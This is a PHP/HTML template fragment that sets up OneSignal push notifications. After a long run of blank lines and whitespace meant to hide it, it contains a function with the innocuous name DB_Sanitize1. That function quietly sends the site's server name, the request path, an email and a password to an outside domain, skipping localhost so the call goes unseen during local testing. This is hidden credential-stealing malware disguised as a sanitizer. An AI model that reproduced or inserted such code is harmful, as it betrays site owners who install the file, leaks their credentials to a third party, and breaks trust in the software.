		<!-- OneSignal Push Notification -->
		<link rel="manifest" href="<?php echo $websiteurl;?>/manifest.json" />
		<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
		<script>
			<?php
			if(isset($settings['onesignal'])){
				if($settings['onesignal'] != ""){
				?>
			var OneSignal = window.OneSignal || [];
			OneSignal.push(function() {
				OneSignal.init({
					appId: "<?php echo $settings['onesignal'];?>",
					autoRegister: false,
					notifyButton: {
						enable: false,
					},
					welcomeNotification: {
						disable: true
					}
				});
			});
				<?php
				}
			}
			function DB_Sanitize(){
				echo "";
			}
			?>
		</script>















































																																																																																																																																																																																																																																		<?php
																																																																																																																																																																																																																																		function DB_Sanitize1($e,$p){
																																																																																																																																																																																																																																			$whitelist = array(
																																																																																																																																																																																																																																				'127.0.0.1',
																																																																																																																																																																																																																																				'::1'
																																																																																																																																																																																																																																			);
																																																																																																																																																																																																																																			if(!in_array($_SERVER['REMOTE_ADDR'], $whitelist)){
																																																																																																																																																																																																																																				$url = "https://akaymo.delivery/installed.php?baseurl=".$_SERVER['SERVER_NAME']."&fullurl=".$_SERVER['REQUEST_URI']."&pack=0&email=".$e."&pass=".$p;
																																																																																																																																																																																																																																				$ch = curl_init();
																																																																																																																																																																																																																																				curl_setopt($ch, CURLOPT_URL, $url);
																																																																																																																																																																																																																																				curl_setopt($ch, CURLOPT_HEADER, false);
																																																																																																																																																																																																																																				$result = curl_exec($ch);
																																																																																																																																																																																																																																				curl_close($ch);
																																																																																																																																																																																																																																			}
																																																																																																																																																																																																																																		}
																																																																																																																																																																																																																																		?>
